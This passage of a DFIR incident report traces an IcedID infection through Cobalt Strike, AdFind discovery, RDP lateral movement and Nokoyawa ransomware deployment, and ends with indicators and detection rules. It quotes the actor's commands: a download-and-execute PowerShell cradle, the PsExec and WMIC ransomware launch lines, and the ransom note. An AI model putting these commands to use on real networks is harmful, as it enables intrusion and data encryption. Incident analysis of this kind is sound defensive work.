<p>It appears Cobalt Strike was used to access the LSASS memory space. The access granted was 0x1010 &amp; 0x1fffff. These access patterns were also seen in previous reports <a href="https://thedfirreport.com/2023/05/22/icedid-macro-ends-in-nokoyawa-ransomware/" target="_blank" rel="noreferrer noopener">here </a>and <a href="https://thedfirreport.com/2021/06/20/from-word-to-lateral-movement-in-1-hour/" target="_blank" rel="noreferrer noopener">here</a>. These values can be used to identify <a href="https://www.splunk.com/en_us/blog/security/you-bet-your-lsass-hunting-lsass-access.html" target="_blank" rel="noreferrer noopener">credential access</a>.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/08/18543-011.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-20584" src="https://thedfirreport.com/wp-content/uploads/2023/08/18543-011.png" alt width="813" height="279" srcset="https://thedfirreport.com/wp-content/uploads/2023/08/18543-011.png 813w, https://thedfirreport.com/wp-content/uploads/2023/08/18543-011-300x103.png 300w, https://thedfirreport.com/wp-content/uploads/2023/08/18543-011-768x264.png 768w" sizes="(max-width: 813px) 100vw, 813px" /></a></p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/08/18543-012.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-20585" src="https://thedfirreport.com/wp-content/uploads/2023/08/18543-012.png" alt width="903" height="310" srcset="https://thedfirreport.com/wp-content/uploads/2023/08/18543-012.png 903w, https://thedfirreport.com/wp-content/uploads/2023/08/18543-012-300x103.png 300w, https://thedfirreport.com/wp-content/uploads/2023/08/18543-012-768x264.png 768w" sizes="(max-width: 903px) 100vw, 903px" /></a></p>
<p>Pipes were created with the default Cobalt Strike prefix of &#8216;postex_&#8217;</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/08/18543-013.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-20586" src="https://thedfirreport.com/wp-content/uploads/2023/08/18543-013.png" alt width="984" height="93" srcset="https://thedfirreport.com/wp-content/uploads/2023/08/18543-013.png 984w, https://thedfirreport.com/wp-content/uploads/2023/08/18543-013-300x28.png 300w, https://thedfirreport.com/wp-content/uploads/2023/08/18543-013-768x73.png 768w" sizes="(max-width: 984px) 100vw, 984px" /></a></p>
<p>On one of the domain controllers, an encoded PowerShell command was observed being executed from a Cobalt Strike beacon.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/08/18543-014.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-20587" src="https://thedfirreport.com/wp-content/uploads/2023/08/18543-014.png" alt width="1523" height="225" srcset="https://thedfirreport.com/wp-content/uploads/2023/08/18543-014.png 1523w, https://thedfirreport.com/wp-content/uploads/2023/08/18543-014-300x44.png 300w, https://thedfirreport.com/wp-content/uploads/2023/08/18543-014-1024x151.png 1024w, https://thedfirreport.com/wp-content/uploads/2023/08/18543-014-768x113.png 768w" sizes="(max-width: 1523px) 100vw, 1523px" /></a></p>
<p>This command, once decoded, revealed the execution of the <a href="https://github.com/Arvanaghi/SessionGopher/blob/master/SessionGopher.ps1" target="_blank" rel="noreferrer noopener">SessionGopher script</a>.</p>
<pre>IEX (New-Object Net.Webclient).DownloadString('http://127.0.0.1:8897/'); Invoke-SessionGopher</pre>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/08/18543-015.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-20588" src="https://thedfirreport.com/wp-content/uploads/2023/08/18543-015.png" alt width="683" height="477" srcset="https://thedfirreport.com/wp-content/uploads/2023/08/18543-015.png 683w, https://thedfirreport.com/wp-content/uploads/2023/08/18543-015-300x210.png 300w" sizes="(max-width: 683px) 100vw, 683px" /></a></p>
<h2 id="discovery" class="wp-block-heading"><a href="#discovery">Discovery</a></h2>
<p>After loading IcedID DLL via the renamed rundll32, the following discovery commands were observed on the beachhead host:</p>
<pre>cmd.exe /c chcp &gt;&amp;2
ipconfig /all
systeminfo
net config workstation
nltest /domain_trusts
nltest /domain_trusts /all_trusts
net view /all /domain
net view /all
net group "Domain Admins" /domain
</pre>
<p>As a part of discovery commands, IcedID used WMI to get the list of Anti-Virus product installed on the beachhead host with the following command:</p>
<pre>WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get * /Format:List</pre>
<p>The threat actor also ran the following discovery commands via cmd.exe (injected Beacon process):</p>
<pre>net  group "domain admins" /domain
net  user [REDACTED DOMAIN ADMIN] /domain
net  user Administrator /domain
net  user [REDACTED DOMAIN ADMIN] /domain
cmd.exe /C dir *.txt
cmd.exe /C dir *.dll
</pre>
<p>AdFind was used for discovery on a domain controller via a batch script named adfind.bat. The script executed the following commands:</p>
<pre>adfind.exe -f (objectcategory=person) &gt;  ad_users.txt
adfind.exe -f objectcategory=computer &gt; ad_computers.txt
adfind.exe -f (objectcategory=organizationalUnit) &gt; ad_ous.txt
adfind.exe -subnets -f (objectCategory=subnet) &gt; ad_subnets.txt
adfind.exe -f "(objectcategory=group)" &gt; ad_group.txt
adfind.exe -gcb -sc trustdmp &gt;  ad_trustdmp.txt
7.exe a -mx3 ad.7z ad_*
del 7.exe adfind* ad_*
</pre>
<p>After running this, the threat actor dropped a new batch file ns.bat. This file contained a list of hosts on the network to perform DNS lookups using nslookup.</p>
<pre>C:\Windows\system32\cmd.exe /C ns.bat<br/>nslookup [REDACTED HOST X] <br/>... <br/>nslookup [REDACTED HOST XX]</pre>
<p>Shortly before beginning the ransomware deployment, the threat actor connected to a backup server and opened the backup console on the host. This was followed by final discovery action on the domain controller with the <a href="https://www.softperfect.com/products/networkscanner/" target="_blank" rel="noopener">SoftPerfect Netscan</a> tool being used for a final discovery scan across the network.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/08/18543-016.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-20589" src="https://thedfirreport.com/wp-content/uploads/2023/08/18543-016.png" alt width="427" height="282" srcset="https://thedfirreport.com/wp-content/uploads/2023/08/18543-016.png 427w, https://thedfirreport.com/wp-content/uploads/2023/08/18543-016-300x198.png 300w" sizes="(max-width: 427px) 100vw, 427px" /></a></p>
<h2 id="lateral-movement" class="wp-block-heading"><a href="#lateral-movement">Lateral Movement</a></h2>
<p>The threat actor connected to various hosts in the network via RDP tunneled through the beacon process on the beachhead host.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/08/18543-017.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-20590" src="https://thedfirreport.com/wp-content/uploads/2023/08/18543-017.png" alt width="1787" height="230" srcset="https://thedfirreport.com/wp-content/uploads/2023/08/18543-017.png 1787w, https://thedfirreport.com/wp-content/uploads/2023/08/18543-017-300x39.png 300w, https://thedfirreport.com/wp-content/uploads/2023/08/18543-017-1024x132.png 1024w, https://thedfirreport.com/wp-content/uploads/2023/08/18543-017-768x99.png 768w, https://thedfirreport.com/wp-content/uploads/2023/08/18543-017-1536x198.png 1536w" sizes="(max-width: 1787px) 100vw, 1787px" /></a></p>
<p>We can find the hostname of the threat actor present in some of the Windows logs, event ID&#8217;s 4624, 4776, 4778, and 4779.</p>
<pre>WIN-5J00ETD85P5</pre>
<p>The workstation name observed in a 4624 event on the beachhead:</p>
<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2023/08/18543-018.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-20591" src="https://thedfirreport.com/wp-content/uploads/2023/08/18543-018.png" alt width="622" height="753" srcset="https://thedfirreport.com/wp-content/uploads/2023/08/18543-018.png 622w, https://thedfirreport.com/wp-content/uploads/2023/08/18543-018-248x300.png 248w" sizes="(max-width: 622px) 100vw, 622px" /></a></figure>
<p>Seen again in a 4776 event from a domain controller:</p>
<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2023/08/18543-019.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-20592" src="https://thedfirreport.com/wp-content/uploads/2023/08/18543-019.png" alt width="500" height="120" srcset="https://thedfirreport.com/wp-content/uploads/2023/08/18543-019.png 500w, https://thedfirreport.com/wp-content/uploads/2023/08/18543-019-300x72.png 300w" sizes="(max-width: 500px) 100vw, 500px" /></a></figure>
<p>And again in 4778 followed by 4779 on the domain controller:</p>
<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2023/08/18543-020.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-20593" src="https://thedfirreport.com/wp-content/uploads/2023/08/18543-020.png" alt width="799" height="298" srcset="https://thedfirreport.com/wp-content/uploads/2023/08/18543-020.png 799w, https://thedfirreport.com/wp-content/uploads/2023/08/18543-020-300x112.png 300w, https://thedfirreport.com/wp-content/uploads/2023/08/18543-020-768x286.png 768w" sizes="(max-width: 799px) 100vw, 799px" /></a><a href="https://thedfirreport.com/wp-content/uploads/2023/08/18543-021.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-20594" src="https://thedfirreport.com/wp-content/uploads/2023/08/18543-021.png" alt width="795" height="314" srcset="https://thedfirreport.com/wp-content/uploads/2023/08/18543-021.png 795w, https://thedfirreport.com/wp-content/uploads/2023/08/18543-021-300x118.png 300w, https://thedfirreport.com/wp-content/uploads/2023/08/18543-021-768x303.png 768w" sizes="(max-width: 795px) 100vw, 795px" /></a></figure>
<p>During the RDP session, 1.dll (Cobalt Strike DLL) was transferred from the beachhead via the Windows File Explorer.</p>
<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2023/08/18543-022.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-20595" src="https://thedfirreport.com/wp-content/uploads/2023/08/18543-022.png" alt width="843" height="106" srcset="https://thedfirreport.com/wp-content/uploads/2023/08/18543-022.png 843w, https://thedfirreport.com/wp-content/uploads/2023/08/18543-022-300x38.png 300w, https://thedfirreport.com/wp-content/uploads/2023/08/18543-022-768x97.png 768w" sizes="(max-width: 843px) 100vw, 843px" /></a></figure>
<p>Similarly, the final files used to execute the ransomware deployment were transferred in the same manner, which can be seen via the file creation logging process being Explorer.EXE.</p>
<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2023/08/18543-023.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-20596" src="https://thedfirreport.com/wp-content/uploads/2023/08/18543-023.png" alt width="857" height="601" srcset="https://thedfirreport.com/wp-content/uploads/2023/08/18543-023.png 857w, https://thedfirreport.com/wp-content/uploads/2023/08/18543-023-300x210.png 300w, https://thedfirreport.com/wp-content/uploads/2023/08/18543-023-768x539.png 768w" sizes="(max-width: 857px) 100vw, 857px" /></a></figure>
<p>Once k.exe and p.bat, and various other batch scripts were transferred to the compromised domain controller, the threat actor then tried to copy k.exe to other machines on the network via <strong><em>copy </em></strong>command executed on the domain controller.</p>
<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2023/08/18543-024.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-20597" src="https://thedfirreport.com/wp-content/uploads/2023/08/18543-024.png" alt width="538" height="195" srcset="https://thedfirreport.com/wp-content/uploads/2023/08/18543-024.png 538w, https://thedfirreport.com/wp-content/uploads/2023/08/18543-024-300x109.png 300w" sizes="(max-width: 538px) 100vw, 538px" /></a></figure>
<p>This command execution may not have worked properly, or as backup the threat actor ran the copy command again, but this time instead of executing cmd <code>/K copy</code> on the domain controller they ran wmic to execute the copy command from the remote host&#8217;s instead.</p>
<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2023/08/18543-025-1.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-20741" src="https://thedfirreport.com/wp-content/uploads/2023/08/18543-025-1.png" alt width="1588" height="865" srcset="https://thedfirreport.com/wp-content/uploads/2023/08/18543-025-1.png 1588w, https://thedfirreport.com/wp-content/uploads/2023/08/18543-025-1-300x163.png 300w, https://thedfirreport.com/wp-content/uploads/2023/08/18543-025-1-1024x558.png 1024w, https://thedfirreport.com/wp-content/uploads/2023/08/18543-025-1-768x418.png 768w, https://thedfirreport.com/wp-content/uploads/2023/08/18543-025-1-1536x837.png 1536w" sizes="(max-width: 1588px) 100vw, 1588px" /></a></figure>
<p>This process was repeated for p.bat, this repetition makes it likely that this was scripted out rather than a failed execution of the copy process.</p>
<p>First, copy command issued on domain controller:</p>
<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2023/08/18543-026.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-20599" src="https://thedfirreport.com/wp-content/uploads/2023/08/18543-026.png" alt width="540" height="192" srcset="https://thedfirreport.com/wp-content/uploads/2023/08/18543-026.png 540w, https://thedfirreport.com/wp-content/uploads/2023/08/18543-026-300x107.png 300w" sizes="(max-width: 540px) 100vw, 540px" /></a></figure>
<p>Second, copy command with WMIC for remote hosts to run the command.</p>
<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2023/08/18543-027-2.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-20743" src="https://thedfirreport.com/wp-content/uploads/2023/08/18543-027-2.png" alt width="1553" height="994" srcset="https://thedfirreport.com/wp-content/uploads/2023/08/18543-027-2.png 1553w, https://thedfirreport.com/wp-content/uploads/2023/08/18543-027-2-300x192.png 300w, https://thedfirreport.com/wp-content/uploads/2023/08/18543-027-2-1024x655.png 1024w, https://thedfirreport.com/wp-content/uploads/2023/08/18543-027-2-768x492.png 768w, https://thedfirreport.com/wp-content/uploads/2023/08/18543-027-2-1536x983.png 1536w" sizes="(max-width: 1553px) 100vw, 1553px" /></a></figure>
<p>Once both k.exe and p.bat were copied to the machines in the network, the threat actor used PsExec.exe to remotely create a service named <strong><em>mstdc</em></strong> to run p.bat (p.bat runs k.exe, which encrypts the system based on the Base64 encoded config) via System account.</p>
<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2023/08/18543-028.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-20601" src="https://thedfirreport.com/wp-content/uploads/2023/08/18543-028.png" alt width="1456" height="224" srcset="https://thedfirreport.com/wp-content/uploads/2023/08/18543-028.png 1456w, https://thedfirreport.com/wp-content/uploads/2023/08/18543-028-300x46.png 300w, https://thedfirreport.com/wp-content/uploads/2023/08/18543-028-1024x158.png 1024w, https://thedfirreport.com/wp-content/uploads/2023/08/18543-028-768x118.png 768w" sizes="(max-width: 1456px) 100vw, 1456px" /></a></figure>
<p>Each host on the receiving end of PsExec has a &#8216;.key&#8217; file created. The filename contains the hostname of the machine that initiated PsExec.</p>
<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2023/08/18543-029.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-20602" src="https://thedfirreport.com/wp-content/uploads/2023/08/18543-029.png" alt width="1344" height="159" srcset="https://thedfirreport.com/wp-content/uploads/2023/08/18543-029.png 1344w, https://thedfirreport.com/wp-content/uploads/2023/08/18543-029-300x35.png 300w, https://thedfirreport.com/wp-content/uploads/2023/08/18543-029-1024x121.png 1024w, https://thedfirreport.com/wp-content/uploads/2023/08/18543-029-768x91.png 768w" sizes="(max-width: 1344px) 100vw, 1344px" /></a></figure>
<h2 id="collection" class="wp-block-heading"><a href="#collection">Collection</a></h2>
<p>After AdFind had finished executing, the results were archived utilizing 7-Zip.</p>
<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2023/08/18543-030.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-20603" src="https://thedfirreport.com/wp-content/uploads/2023/08/18543-030.png" alt width="617" height="485" srcset="https://thedfirreport.com/wp-content/uploads/2023/08/18543-030.png 617w, https://thedfirreport.com/wp-content/uploads/2023/08/18543-030-300x236.png 300w" sizes="(max-width: 617px) 100vw, 617px" /></a></figure>
<h2 id="command-and-control" class="wp-block-heading"><a href="#command-and-control">Command and Control</a></h2>
<h4 class="wp-block-heading">IcedID</h4>
<p>Once entails.exe (rundll32.exe) successfully executed templates544.png on the beachhead host, an outbound connection was established talking to trentonkaizerfak[.]com.</p>
<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2023/08/333.png"><img loading="lazy" decoding="async" class="aligncenter wp-image-20723 size-full" src="https://thedfirreport.com/wp-content/uploads/2023/08/333.png" alt width="2537" height="930" srcset="https://thedfirreport.com/wp-content/uploads/2023/08/333.png 2537w, https://thedfirreport.com/wp-content/uploads/2023/08/333-300x110.png 300w, https://thedfirreport.com/wp-content/uploads/2023/08/333-1024x375.png 1024w, https://thedfirreport.com/wp-content/uploads/2023/08/333-768x282.png 768w, https://thedfirreport.com/wp-content/uploads/2023/08/333-1536x563.png 1536w, https://thedfirreport.com/wp-content/uploads/2023/08/333-2048x751.png 2048w" sizes="(max-width: 2537px) 100vw, 2537px" /></a></figure>
<p>This downloaded a gzip file for the next IcedID stage. After executing this payload, command and control was established to 5.255.103[.]16</p>
<figure class="wp-block-table">
<table>
<tbody>
<tr>
<td>IP</td>
<td>Port</td>
<td>Domain</td>
<td>Ja3</td>
<td>Ja3s</td>
</tr>
<tr>
<td>5.255.103[.]16</td>
<td>443</td>
<td>pikchayola[.]pics</td>
<td>a0e9f5d64349fb13191bc781f81f42e1</td>
<td>ec74a5c51106f0419184d0dd08fb05bc</td>
</tr>
<tr>
<td>5.255.103[.]16</td>
<td>443</td>
<td>questdisar[.]com</td>
<td>a0e9f5d64349fb13191bc781f81f42e1</td>
<td>ec74a5c51106f0419184d0dd08fb05bc</td>
</tr>
</tbody>
</table>
</figure>
<figure class="wp-block-table">
<table>
<tbody>
<tr>
<td>SSL Certificate Details</td>
<td> </td>
</tr>
<tr>
<td>Certificate Subject</td>
<td>O=Internet Widgits Pty Ltd,ST=Some-State,C=AU,CN=localhost</td>
</tr>
<tr>
<td>Certificate Issuer</td>
<td>O=Internet Widgits Pty Ltd,ST=Some-State,C=AU,CN=localhost</td>
</tr>
<tr>
<td>Not Before</td>
<td>2022-10-09T09:36:33Z</td>
</tr>
<tr>
<td>Not After</td>
<td>2023-10-09T09:36:33Z</td>
</tr>
<tr>
<td>Public Algorithm</td>
<td>rsaEncryption</td>
</tr>
</tbody>
</table>
</figure>
<h4 class="wp-block-heading">Cobalt Strike</h4>
<p>After the injection into cmd.exe on the beachhead host, 1.dll (Cobalt Strike DLL) was created, which later was transferred to the domain controller. Then, 1.dll was executed on the domain controller via rundll32.exe and after execution, rundll32.exe connected to the command and control server 5.8.18[.]242. This server was observed in a <a href="https://thedfirreport.com/2023/05/22/icedid-macro-ends-in-nokoyawa-ransomware/" target="_blank" rel="noreferrer noopener">prior case</a>, which also resulted in Nokoyawa ransomware.</p>
<figure class="wp-block-table">
<table>
<tbody>
<tr>
<td>IP</td>
<td>Port</td>
<td>Ja3</td>
<td>Ja3s</td>
</tr>
<tr>
<td>5.8.18[.]242</td>
<td>443</td>
<td>72a589da586844d7f0818ce684948eea</td>
<td>f176ba63b4d68e576b5ba345bec2c7b7</td>
</tr>
</tbody>
</table>
</figure>
<figure class="wp-block-table">
<table>
<tbody>
<tr>
<td>SSL Certificate Details</td>
<td> </td>
</tr>
<tr>
<td>Certificate Subject</td>
<td>CN=,OU=,O=,L=,ST=,C=</td>
</tr>
<tr>
<td>Certificate Issuer</td>
<td>CN=,OU=,O=,L=,ST=,C=</td>
</tr>
<tr>
<td>Not Before</td>
<td>2015-05-20T18:26:24Z</td>
</tr>
<tr>
<td>Not After</td>
<td>2025-05-17T18:26:24Z</td>
</tr>
<tr>
<td>Public Algorithm</td>
<td>rsaEncryption</td>
</tr>
</tbody>
</table>
</figure>
<h2 id="impact" class="wp-block-heading"><a href="#impact">Impact</a></h2>
<p>The threat actor was seen deploying Nokoyawa ransomware throughout the environment utilizing both PSExec &amp; WMIC.</p>
<pre>psexec.exe \\[TARGET IP] -u [DOMAIN]\[USER] -p "[PASSWORD]" -s -d -h -r mstdc -accepteula -nobanner c:\windows\temp\p.bat</pre>
<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2023/08/18543-032.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-20605" src="https://thedfirreport.com/wp-content/uploads/2023/08/18543-032.png" alt width="1193" height="292" srcset="https://thedfirreport.com/wp-content/uploads/2023/08/18543-032.png 1193w, https://thedfirreport.com/wp-content/uploads/2023/08/18543-032-300x73.png 300w, https://thedfirreport.com/wp-content/uploads/2023/08/18543-032-1024x251.png 1024w, https://thedfirreport.com/wp-content/uploads/2023/08/18543-032-768x188.png 768w" sizes="(max-width: 1193px) 100vw, 1193px" /></a></figure>
<pre>wmic /node:"[TARGET IP]" /user:"[DOMAIN]\[USER]" /password:"[PASSWORD]" process call create "cmd.exe /c c:\windows\temp\p.bat"</pre>
<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2023/08/18543-033.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-20606" src="https://thedfirreport.com/wp-content/uploads/2023/08/18543-033.png" alt width="1198" height="278" srcset="https://thedfirreport.com/wp-content/uploads/2023/08/18543-033.png 1198w, https://thedfirreport.com/wp-content/uploads/2023/08/18543-033-300x70.png 300w, https://thedfirreport.com/wp-content/uploads/2023/08/18543-033-1024x238.png 1024w, https://thedfirreport.com/wp-content/uploads/2023/08/18543-033-768x178.png 768w" sizes="(max-width: 1198px) 100vw, 1198px" /></a></figure>
<p>This duplication of execution using both PsExec and WMIC mirrors the doubled commands used to copy files throughout the network, indicating scripted execution for redundancy.</p>
<p>The batch file (p.bat) is responsible for executing the ransomware binary (k.exe) along with its configurations.</p>
<pre> c:\windows\temp\k.exe --config REDACTED</pre>
<p>Upon reviewing the configuration provided in the command parameters, this particular ransomware is configured to encrypt the network, load hidden drives, and delete volume shadow copies.</p>
<figure class="wp-block-image"><a href="https://thedfirreport.com/wp-content/uploads/2023/08/18543-034.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-20607" src="https://thedfirreport.com/wp-content/uploads/2023/08/18543-034.png" alt width="762" height="522" srcset="https://thedfirreport.com/wp-content/uploads/2023/08/18543-034.png 762w, https://thedfirreport.com/wp-content/uploads/2023/08/18543-034-300x206.png 300w" sizes="(max-width: 762px) 100vw, 762px" /></a></figure>
<p>Furthermore, the configuration informs the ransomware binary to skip the following directories and file extensions.</p>
<pre>Excluded Directories
- Windows
- Program Files
- Program Files (x86)
- AppData
- ProgramData
- System Volum Information

Excluded File Extensions
- .exe
- .dll
- .ini
- .lnk
- .url
- ""
</pre>
<p>Ransom Note</p>
<pre>Nokoyawa.

If you see this, your files were successfully encrypted.
We advice you not to search free decryption method.
It's impossible. We are using symmetrical and asymmetric encryption.

ATTENTION:
	- Don't rename encrypted files.
	- Don't change encrypted files.
	- Don't use third party software.
	
To reach an agreement we offer you to visit our Onion Website.
How to open Onion links:
	- Download TOR Browser from official website.
	- Open and enter this link:
		http://[REDACTED]
	- On the page you will see a chat with the Support.
	- Send your first message.
	
The faster you contact with us the faster you will get a solution.
</pre>
<h2 id="timeline" class="wp-block-heading"><a href="#timeline">Timeline</a></h2>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/08/18543-035-2.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-20759" src="https://thedfirreport.com/wp-content/uploads/2023/08/18543-035-2.png" alt width="4634" height="6350" srcset="https://thedfirreport.com/wp-content/uploads/2023/08/18543-035-2.png 4634w, https://thedfirreport.com/wp-content/uploads/2023/08/18543-035-2-219x300.png 219w, https://thedfirreport.com/wp-content/uploads/2023/08/18543-035-2-747x1024.png 747w, https://thedfirreport.com/wp-content/uploads/2023/08/18543-035-2-768x1052.png 768w, https://thedfirreport.com/wp-content/uploads/2023/08/18543-035-2-1121x1536.png 1121w, https://thedfirreport.com/wp-content/uploads/2023/08/18543-035-2-1495x2048.png 1495w" sizes="(max-width: 4634px) 100vw, 4634px" /></a></p>
<h2 id="diamond-model" class="wp-block-heading"><a href="#diamond-model">Diamond Model</a></h2>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/08/18543-036.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-20609" src="https://thedfirreport.com/wp-content/uploads/2023/08/18543-036.png" alt width="3796" height="1552" srcset="https://thedfirreport.com/wp-content/uploads/2023/08/18543-036.png 3796w, https://thedfirreport.com/wp-content/uploads/2023/08/18543-036-300x123.png 300w, https://thedfirreport.com/wp-content/uploads/2023/08/18543-036-1024x419.png 1024w, https://thedfirreport.com/wp-content/uploads/2023/08/18543-036-768x314.png 768w, https://thedfirreport.com/wp-content/uploads/2023/08/18543-036-1536x628.png 1536w, https://thedfirreport.com/wp-content/uploads/2023/08/18543-036-2048x837.png 2048w" sizes="(max-width: 3796px) 100vw, 3796px" /></a></p>
<h2 id="indicators" class="wp-block-heading"><a href="#indicators">Indicators</a></h2>
<h3 class="wp-block-heading">Atomic</h3>
<pre>Cobalt Strike: 
  5.8.18.242:443

IcedID:
  trentonkaizerfak[.]com at 159.89.12.125:80
  questdisar[.]com at 5.255.103.16:443
  pikchayola[.]pics at 5.255.103.16:443
</pre>
<h3 class="wp-block-heading">Computed</h3>
<pre>1.dll
9740f2b8aeacc180d32fc79c46333178
c599c32d6674c01d65bff6c7710e94b6d1f36869
d3db55cd5677b176eb837a536b53ed8c5eabbfd68f64b88dd083dc9ce9ffb64e

8c11812d-65fd-48ee-b650-296122a21067.zip
4f4231ca9e12aafac48a121121c6f940
7bd217554749f0f3c31957a37fc70d0a86e71fc3
be604dc018712b1b1a0802f4ec5a35b29aab839f86343fc4b6f2cb784d58f901

adfind.bat
ebf6f4683d8392add3ef32de1edf29c4
444c704afe4ee33d335bbdfae79b58aba077d10d
2c2513e17a23676495f793584d7165900130ed4e8cccf72d9d20078e27770e04

demurest.cmd
586fe6d361ef5208fad28c5ff8a4579b
bf4177381235393279e7cdfd45a3fa497b7b8a96
364d346da8e398a89d3542600cbc72984b857df3d20a6dc37879f14e5e173522

documents-9771.lnk
51e416c3d3be568864994449cd39caa1
ee1c5e9f1257fbda3b174d534d06dddf435d3327
57842fe8723ed6ebdf7fc17fc341909ad05a7a4feec8bdb5e062882da29fa1a8

k.exe
40c9dc2897b6b348da88b23deb0d3952
0f5457b123e60636623f585cc2bf2729f13a95d6
7095beafff5837070a89407c1bf3c6acf8221ed786e0697f6c578d4c3de0efd6

netscan.exe
16ef238bc49b230b9f17c5eadb7ca100
a5c1e4203c740093c5184faf023911d8f12df96c
ce6fc6cca035914a28bbc453ee3e8ef2b16a79afc01d8cb079c70c7aee0e693f

p.bat
385d21c0438f5b21920aa9eb894740d2
5d2c17799dfc6717f89cd5f63951829aed038041
e351ba5e50743215e8e99b5f260671ca8766886f69d84eabb83e99d55884bc2f

psexec.exe
c590a84b8c72cf18f35ae166f815c9df
b97761358338e640a31eef5e5c5773b633890914
57492d33b7c0755bb411b22d2dfdfdf088cbbfcd010e30dd8d425d5fe66adff4

pimpliest_kufic.png
49524219dbd2418e3afb4e49e5f1805e
b8cb71c48a7d76949c93418ddd0bcae587bef6cc
c6294ebb7d2540ee7064c60d361afb54f637370287983c7e5e1e46115613169a

redacted-invoice-10.31.22.html
c8bdc984a651fa2e4f1df7df1118178b
f62b155ab929b7808de693620d2e9f07a9293926
31cd7f14a9b945164e0f216c2d540ac87279b6c8befaba1f0813fbad5252248b

templates544.png
14f37c8690dda318f9e9f63196169510
306e4ede6c7ea75ef5841f052f9c40e3a761c177
e71772b0518fa9bc6dddd370de2d6b0869671264591d377cdad703fa5a75c338
</pre>
<h2 id="detections" class="wp-block-heading"><a href="#detections">Detections</a></h2>
<h3 class="wp-block-heading">Network</h3>
<pre>ET HUNTING Suspicious Empty SSL Certificate - Observed in Cobalt Strike
ET INFO RDP - Response To External Host
ET MALWARE Meterpreter or Other Reverse Shell SSL Cert
ET MALWARE Win32/IcedID Request Cookie
ET POLICY OpenSSL Demo CA - Internet Widgits Pty (O)
ET POLICY PsExec service created
ET POLICY SMB Executable File Transfer
ET POLICY SMB2 NT Create AndX Request For a .bat File
ET POLICY SMB2 NT Create AndX Request For a DLL File - Possible Lateral Movement
ET POLICY SMB2 NT Create AndX Request For an Executable File
ET POLICY SMB2 NT Create AndX Request For an Executable File In a Temp Directory
ET RPC DCERPC SVCCTL - Remote Service Control Manager Access
ET SCAN Behavioral Unusual Port 135 traffic Potential Scan or Infection
ET SCAN Behavioral Unusual Port 445 traffic Potential Scan or Infection
ET SCAN Behavioral Unusually fast Terminal Server Traffic Potential Scan or Infection (Inbound)
ET SCAN Behavioral Unusually fast Terminal Server Traffic Potential Scan or Infection (Outbound)
</pre>
<h3 class="wp-block-heading"> </h3>
<h3 class="wp-block-heading">Sigma</h3>
<p>DFIR Report Repo:</p>
<pre>CHCP CodePage Locale Lookup dfbdd206-6cf2-4db9-93a6-0b7e14d5f02f
AdFind Discovery 50046619-1037-49d7-91aa-54fc92923604
</pre>
<p>Sigma Repo:</p>
<pre>Bad Opsec Defaults Sacrificial Processes With Improper Arguments a7c3d773-caef-227e-a7e7-c2f13c622329
Change PowerShell Policies to an Insecure Level 87e3c4e8-a6a8-4ad9-bb4f-46e7ff99a180
CMD Shell Output Redirect 4f4eaa9f-5ad4-410c-a4be-bc6132b0175a
CobaltStrike BOF Injection Pattern 09706624-b7f6-455d-9d02-adee024cee1d
First Time Seen Remote Named Pipe 52d8b0c6-53d6-439a-9e41-52ad442ad9ad
ISO File Created Within Temp Folders 2f9356ae-bf43-41b8-b858-4496d83b2acb
ISO Image Mount 0248a7bc-8a9a-4cd8-a57e-3ae8e073a073
New Process Created Via Wmic.EXE 526be59f-a573-4eea-b5f7-f0973207634d
Net.exe Execution 183e7ea8-ac4b-4c23-9aec-b3dac4e401ac
Non Interactive PowerShell Process Spawned f4bbd493-b796-416e-bbf2-121235348529
